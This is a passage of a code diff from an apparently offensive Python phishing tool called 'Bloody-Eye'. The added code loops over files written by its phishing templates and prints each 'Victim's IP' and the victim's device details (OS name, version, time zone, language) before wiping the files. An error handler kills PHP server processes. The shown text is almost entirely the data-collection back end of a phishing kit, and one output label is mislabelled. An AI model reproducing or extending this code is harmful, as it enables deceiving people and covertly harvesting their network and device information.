+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Victim's IP Found")
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.GREEN+"%s"%(i))
+                    o = open("../Bloody-Eye/templates/phishing/ip.txt","w")
+                    o.write("")
+                    o.close()
+                except:
+                    None
+    # Getting Victim Info
+        def info():
+                global stat_file
+                if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
+                    stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
+                    fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
+                    b = fileip.read()
+                try:
+                    infor = json.loads(b)
+                    for value in infor['dev']:
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])
+                        a = open("../Bloody-Eye/templates/phishing/info.json","w")
+                        b = a.write("")
+                        a.close()
+                except:
+                    None
+        while True:
+            userin()
+            readip()
+            info()
 except:
-    with open("exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      print("please check your internet connection ! ! !")
-      time.sleep(5)
-      os.system("clear")
-      sys.exit()
+        with open("exit","w") as kill:
+          Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
+          print("please check your internet connection ! ! !")
+          time.sleep(5)
+          os.system("clear")
+          sys.exit()
     
 def github():
   try:
